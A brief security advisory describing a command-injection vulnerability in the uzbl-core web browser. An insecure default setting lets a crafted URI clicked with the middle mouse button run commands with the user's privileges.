uzbl 'uzbl-core' is prone to a vulnerability that lets attackers inject arbitrary commands because the application fails to adequately sanitize user-supplied input. This issue stems from an insecure default configuration setting.

To exploit this issue, attackers must entice an unsuspecting user to click on a specially crafted URI with their middle mouse button.

Exploiting this issue would permit remote attackers to inject and execute commands with the privileges of a user running the application.
